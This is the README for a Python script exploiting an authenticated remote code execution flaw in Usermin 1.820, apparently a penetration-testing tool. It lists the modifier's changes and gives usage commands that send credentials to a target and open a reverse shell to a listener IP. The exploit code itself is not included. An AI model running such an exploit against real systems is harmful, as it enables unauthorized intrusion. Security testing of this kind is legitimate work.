# Usermin 1.820 Remote Code Execution (Authenticated) Exploit

**Original Author:** Numan Türle  
**Original Date:** 27.08.2021  
**Original PoC:** [Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50234)  
**Exploit Reference:** [Usermin - Remote Code Execution (Authenticated) (Version 1.820)](https://youtu.be/wiRIWFAhz24)  

---

## Description

This Python script exploits an authenticated remote code execution vulnerability in Usermin `<= 1.820` by abusing the GnuPG functionality to execute arbitrary commands on the target system.

---

## Changes (05/25)

The original script by Numan Türle has been updated to improve usability and reliability. The key changes include:

- Added command-line options for specifying the listener IP (`-lh`) and port (`-lp`) for the reverse shell, replacing the hardcoded values.
- Improved string handling by using `.text` instead of converting raw content bytes to string.
- Simplified login check by using a direct substring check rather than regex.
- Added more robust error handling around the final request that triggers the payload, to gracefully catch and handle expected timeouts or connection drops without printing ugly Python tracebacks.
- Added user-friendly console messages to indicate successful payload submission and expected reverse shell behavior.
- Improved argument parsing to provide guidance and defaults for easier usage.
- Early checks to confirm the key ID extraction before continuing to avoid crashes.
- General code cleanup for readability and maintainability.

---

## Usage

```bash
python3 usermin-rce.py -u <target_ip> -l <username> -p <password> -lh <listener_ip> -lp <listener_port>
```

### Example:

```bash
python3 usermin-rce.py -u 192.168.10.157 -l cassie -p cassie -lh 192.168.20.154 -lp 443
```

## Notes
- Requires Python 3 and the requests library.
- The listener IP and port should correspond to your machine listening for the reverse shell connection.
- The script suppresses SSL warnings for self-signed certificates.

## Disclaimer

Use this script only on systems you have explicit permission to test. Unauthorized access or exploitation is illegal and unethical.
